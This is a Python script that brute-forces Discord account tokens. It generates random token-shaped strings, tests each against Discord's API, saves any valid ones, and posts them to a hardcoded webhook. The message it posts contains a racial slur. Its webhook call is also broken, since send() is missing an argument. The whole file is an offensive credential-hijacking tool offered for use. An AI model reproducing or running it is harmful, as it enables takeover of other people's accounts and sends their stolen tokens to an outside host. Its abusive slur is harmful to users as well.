import random
import string
import os
from time import sleep, time
import requests
import base64
from colorama import Fore, Style, init
init(convert=True)
from random import randint
from datetime import datetime

_ = input(f"How many tokens or input infinite for generate and check infinite tokens : ")
count = 0
current_path = os.path.dirname(os.path.realpath(__file__))
url = "https://discordapp.com/api/v6/users/@me/library"
webhook = "https://discord.com/api/webhooks/947175407952736286/8siXhFzW4ow8lBA2wvXqu_oV5oohYyuBft7cETZS_rAdQeJbbM6pAN4B0ZAokjqnW8MC"


if _ == 'infinite':
    _ = 9223372036854775807
else:
    _ = _

def send(msg, wb):
    r = requests.post(wb, data={'content': msg})
    return r.status_code, r.text




f = open(current_path+"/"+"valid-tokens.txt", "a")

while(int(count) < int(_)):
    tokens = []
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(randint(000000000000000000, 999999999999999999))
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        count += 1
        tokens.append(token)

    for token in tokens:
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }
        try:
            r = requests.get(url, headers=header)
            if r.status_code == 200:
                print(f"{Fore.GREEN}[{count}] Token {token}")
                f.write(f"[{datetime.now()}]: {token}")
                send(f"@everyone NIGGA TOKEN ALERT [{datetime.now()} | {count}] VALID: **||{token}||**")
                sleep(5)
            elif "rate limited." in r.text:
                print(f"{Fore.CYAN} [-] Discord blocking requests, waiting 1 minute")
                sleep(60)
            else:
                print(f"{Fore.RED}[{count}] Token {token}")
        except requests.exceptions.ProxyError:
            print("BAD PROXY")
    tokens.remove(token)
